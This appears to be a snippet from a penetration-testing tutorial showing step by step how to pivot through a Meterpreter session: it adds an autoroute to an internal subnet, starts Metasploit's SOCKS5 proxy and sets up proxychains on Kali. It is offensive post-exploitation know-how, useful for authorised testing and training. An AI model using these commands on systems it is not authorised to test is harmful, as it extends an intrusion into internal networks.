bash

```bash
# In meterpreter — check interfaces to confirm dual-homed
meterpreter > ipconfig
# You should see one NIC on your 192.168.x.x and one on 172.16.150.x

# Step 1: Add route to internal subnet through your session
meterpreter > run autoroute -s 172.16.150.0/24

# Verify
meterpreter > run autoroute -p

# Step 2: Background the session
meterpreter > background

# Step 3: Start SOCKS proxy
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > set VERSION 5
msf6 auxiliary(server/socks_proxy) > run -j

# Step 4: Configure proxychains on Kali
# Edit /etc/proxychains4.conf — make sure the last line is:
# socks5 127.0.0.1 1080
```